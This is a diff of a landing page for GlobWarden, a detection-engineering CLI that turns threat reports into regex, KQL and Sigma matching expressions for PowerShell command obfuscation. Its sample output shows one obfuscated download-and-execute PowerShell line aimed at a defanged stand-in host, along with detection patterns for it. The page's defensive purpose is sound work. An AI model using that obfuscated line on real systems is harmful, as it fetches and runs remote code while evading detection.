@@ -280,7 +280,7 @@ table.ctable{ width:100%; border-collapse:collapse; min-width:640px; }
 
       <div class="eyebrow cyan">MITRE ATT&amp;CK T1027.010 · detection tooling</div>
       <h1>Feed it a report. It hands you the <span class="accent">detection content</span> — in five languages, in seconds.</h1>
-      <p class="lede">GlobWarden is a CLI that reads a threat-intel report — a URL, a PDF, raw text, a code file, or an image — and uses an LLM to identify command-obfuscation techniques described in it. For each one it finds, it generates ready-to-use detection rules in regex, KQL, SPL, YARA-L, and Sigma, in one pass.</p>
+      <p class="lede">GlobWarden is a CLI that reads a threat-intel report — a URL, a PDF, raw text, a code file, or an image — and uses an LLM to identify command-obfuscation techniques described in it. For each one it finds, it generates the matching regex, formatted for regex, KQL, SPL, YARA-L, and Sigma at once, in one pass — the matching expression itself, not a complete standalone rule.</p>
 
       <div class="hero-ctas">
         <a class="btn btn-primary" href="#install">
@@ -300,7 +300,7 @@ table.ctable{ width:100%; border-collapse:collapse; min-width:640px; }
       </div>
 
       <blockquote class="origin">
-        <p>STEEP#MAVERICK's wildcard <code class="mono">Get-Alias</code>/<code class="mono">Get-Command</code> pattern had no name in ATT&amp;CK until T1027.010 was written — and that gap only closed because someone had to manually read the campaign write-up and translate "here's the pattern" into "here's how you'd actually detect it." GlobWarden automates that translation step.</p>
+        <p>A wildcard <code class="mono">Get-Alias</code>/<code class="mono">Get-Command</code> resolution pattern used to invoke a cmdlet indirectly had no name in ATT&amp;CK until T1027.010 was written — and that gap only closes because someone has to manually read a report and translate "here's the pattern" into "here's how you'd actually detect it." GlobWarden automates that translation step.</p>
         <cite>— why this tool exists</cite>
       </blockquote>
     </div>
@@ -461,7 +461,7 @@ table.ctable{ width:100%; border-collapse:collapse; min-width:640px; }
       <div class="section-head">
         <div class="eyebrow">See it run</div>
         <h2 class="h2">A wildcard alias trick, from report to rule.</h2>
-        <p class="section-lede">The same <code class="mono">Get-Alias</code> wildcard pattern from STEEP#MAVERICK, run through GlobWarden with three rule languages requested. <em>Illustrative output</em> — content is real, styling is hand-laid-out for this page rather than a raw terminal capture; see the <a href="https://github.com/bobby-tablez/GlobWarden#see-it-run" style="color:var(--accent-2);">README</a> for a byte-for-byte reproducible <code class="mono">--provider fake</code> capture you can run yourself right now.</p>
+        <p class="section-lede">A <code class="mono">Get-Alias</code> wildcard-resolution pattern (T1027.010), run through GlobWarden with three rule languages requested. <em>Illustrative output</em> — content is real, styling is hand-laid-out for this page rather than a raw terminal capture; see the <a href="https://github.com/bobby-tablez/GlobWarden#see-it-run" style="color:var(--accent-2);">README</a> for a byte-for-byte reproducible <code class="mono">--provider fake</code> capture you can run yourself right now.</p>
       </div>
 
       <div class="term">
@@ -482,7 +482,7 @@ table.ctable{ width:100%; border-collapse:collapse; min-width:640px; }
 <span class="t-accent">│</span> <span class="t-dim">example    </span><span class="t-fg">.(gal ?e[?x])((gal ?rm) 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')</span>
 <span class="t-accent">└─────────────────────────────────────────────────────────────┘</span>
 
-<span class="t-dim">Generating rules: regex, sigma, kql ..... </span><span class="t-ok">done</span>
+<span class="t-dim">Generating detection logic (1 call: regex, sigma, kql) </span><span class="t-ok">done</span>
 <span class="t-dim">Validating ............................. </span><span class="t-ok">3/3 valid</span><span class="t-dim"> (regex compiled · sigma YAML parsed · kql syntax OK)</span>
 
 <span class="t-accent">┌─ regex ─ f1 ─ valid ──────────────────────────────────────────┐</span>
@@ -502,12 +502,10 @@ table.ctable{ width:100%; border-collapse:collapse; min-width:640px; }
 <span class="t-accent">└─────────────────────────────────────────────────────────────┘</span>
 
 <span class="t-accent">┌─ kql ─ f1 ─ valid ─────────────────────────────────────────────┐</span>
-<span class="t-fg">DeviceProcessEvents</span>
-<span class="t-fg">| where ProcessCommandLine has_any ('gal ', 'gcm ')</span>
-<span class="t-fg">| where ProcessCommandLine matches regex </span><span class="t-dim">@"\(\?e\[?\?x\]?\)"</span>
+<span class="t-fg">ProcessCommandLine matches regex </span><span class="t-dim">@"\(\?e\[?\?x\]?\)"</span>
 <span class="t-accent">└─────────────────────────────────────────────────────────────┘</span>
 
-<span class="t-dim">1 finding → 3 rules generated · 0 invalid · done in 8.7s</span>
+<span class="t-dim">1 finding → 3 matching expressions generated · 0 invalid · done in 8.7s</span>
 <span class="t-prompt">$</span> <span class="cursor"></span></pre>
       </div>
     </div>
@@ -529,13 +527,13 @@ table.ctable{ width:100%; border-collapse:collapse; min-width:640px; }
         </div>
         <div class="card">
           <svg class="icon" viewBox="0 0 34 34" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true"><circle cx="9" cy="17" r="4"/><line x1="13" y1="17" x2="21" y2="8"/><line x1="13" y1="17" x2="21" y2="14"/><line x1="13" y1="17" x2="21" y2="20"/><line x1="13" y1="17" x2="21" y2="26"/><circle cx="24" cy="8" r="2.2" fill="currentColor" stroke="none"/><circle cx="24" cy="14" r="2.2" fill="currentColor" stroke="none"/><circle cx="24" cy="20" r="2.2" fill="currentColor" stroke="none"/><circle cx="24" cy="26" r="2.2" fill="currentColor" stroke="none"/></svg>
-          <h3>One pass, five rule languages</h3>
-          <p>regex, KQL, SPL, YARA-L, and Sigma are generated together from the same findings, cross-referenced by finding ID — a regex hit and a Sigma rule for the same technique trace back to the same evidence. This fan-out, not any single translation, is the core differentiator.</p>
+          <h3>One combined call, five rule languages</h3>
+          <p>regex, KQL, SPL, YARA-L, and Sigma matching logic are generated together from the same findings in a single combined call per finding, cross-referenced by finding ID — a regex hit and a Sigma detection block for the same technique trace back to the same evidence. Output is the matching expression itself, not a complete standalone rule — drop it into your own rule structure.</p>
         </div>
         <div class="card">
           <svg class="icon" viewBox="0 0 34 34" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true"><path d="M17 3 L29 8 v9 c0 8-5 12-12 14-7-2-12-6-12-14 V8 Z"/><path d="M11 17 l4 4 8-9" stroke-linecap="round" stroke-linejoin="round"/></svg>
           <h3>Validated before you see it</h3>
-          <p>Every generated rule is checked before it's shown: regex is actually compiled, Sigma is actually YAML-parsed. A rule that fails validation is marked invalid with the reason attached — never silently dropped, never silently trusted.</p>
+          <p>Every generated matching expression is checked before it's shown: regex is actually compiled, Sigma is actually YAML-parsed. Content that fails validation is marked invalid with the reason attached — never silently dropped, never silently trusted.</p>
         </div>
         <div class="card">
           <svg class="icon" viewBox="0 0 34 34" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true"><rect x="4" y="4" width="26" height="26" rx="4"/><path d="M11 12 h12 M11 17 h8 M11 22 h5" stroke-linecap="round"/></svg>
@@ -569,14 +567,14 @@ table.ctable{ width:100%; border-collapse:collapse; min-width:640px; }
             <tr>
               <td class="tool">Uncoder AI<br/><span style="font-weight:400;color:var(--fg-faint);">(SOC Prime)</span></td>
               <td>The dominant rule-translation tool — Sigma/Roota into 48+ SIEM languages. It translates a rule you already have.</td>
-              <td class="diff">GlobWarden does the step before that: reading a report that has no rule yet and producing the first draft. Complementary, not competing.</td>
+              <td class="diff">GlobWarden does the step before that: reading a report that has no detection logic yet and drafting the matching expression for it. Complementary, not competing.</td>
             </tr>
           </tbody>
         </table>
       </div>
 
       <div class="aside">
-        <b>Also worth knowing:</b> LLMCloudHunter and SigmaGen are academic pipelines that proved report-to-Sigma works, but neither is a maintained OSS CLI and both target one output format. Revoke-Obfuscation, PSDecode, and CyberChef solve the adjacent problem — deobfuscating a sample you already have in hand — not extracting techniques described in a report you're reading. And a companion project in this talk's kit, <code class="mono">t1027010_hunter.py</code>, runs the opposite direction of GlobWarden: it statically analyzes PowerShell scripts you already have, rather than reading prose about a technique to produce new detection content.
+        <b>Also worth knowing:</b> LLMCloudHunter and SigmaGen are academic pipelines that proved report-to-Sigma works, but neither is a maintained OSS CLI and both target one output format. Revoke-Obfuscation, PSDecode, and CyberChef solve the adjacent problem — deobfuscating a sample you already have in hand — not extracting techniques described in a report you're reading.
       </div>
     </div>
   </section>
